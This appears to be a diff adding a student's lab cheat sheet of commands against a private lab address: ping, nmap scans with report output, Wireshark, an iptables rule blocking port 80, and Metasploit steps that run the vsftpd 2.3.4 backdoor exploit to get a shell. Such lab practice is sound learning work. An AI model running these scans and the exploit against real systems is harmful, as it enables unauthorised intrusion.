@@ -1,0 +1,20 @@
+# Ping
+ping 192.168.56.102
+
+# Nmap Scan
+nmap -sS -sV -O 192.168.56.102
+
+# Save Report
+nmap -sS -sV -O 192.168.56.102 -oN report.txt
+
+# Wireshark
+wireshark
+
+# Firewall
+sudo iptables -A INPUT -p tcp --dport 80 -j DROP
+
+# Metasploit
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST 192.168.56.102
+run
